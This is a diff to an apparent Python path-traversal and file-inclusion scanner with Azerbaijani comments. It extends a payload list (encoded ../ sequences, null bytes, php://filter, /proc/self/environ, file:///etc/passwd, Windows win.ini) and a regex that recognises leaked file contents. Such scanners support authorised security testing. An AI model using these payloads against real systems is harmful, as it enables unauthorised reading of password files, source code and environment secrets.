@@ -18,10 +18,19 @@ PAYLOADLAR = [
     "../../../../../../etc/passwd",
     "....//....//....//....//etc/passwd",
     "/etc/passwd",
-    "..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd",            # ikiqat kodlaşdırma
+    "/etc/passwd%00",                                   # null bayt
+    "....\\\\....\\\\....\\\\windows\\\\win.ini",       # Windows
+    "..\\..\\..\\..\\windows\\win.ini",
+    "php://filter/convert.base64-encode/resource=index.php",  # PHP wrapper
+    "/proc/self/environ",
+    "file:///etc/passwd",
 ]
-# Linux parol faylının imzası + Windows
-IMZA = re.compile(r"root:.*:0:0:|\[fonts\]|\[extensions\]", re.IGNORECASE)
+# Linux parol faylı + Windows win.ini + php base64 + proc env
+IMZA = re.compile(
+    r"root:.*:0:0:|\[fonts\]|\[extensions\]|\[mci extensions\]|"
+    r"PD9waHA|<\?php|HTTP_USER_AGENT=|DOCUMENT_ROOT=", re.IGNORECASE)
 
 
 def yoxla(parametrli_url, hesabat, timeout=8):
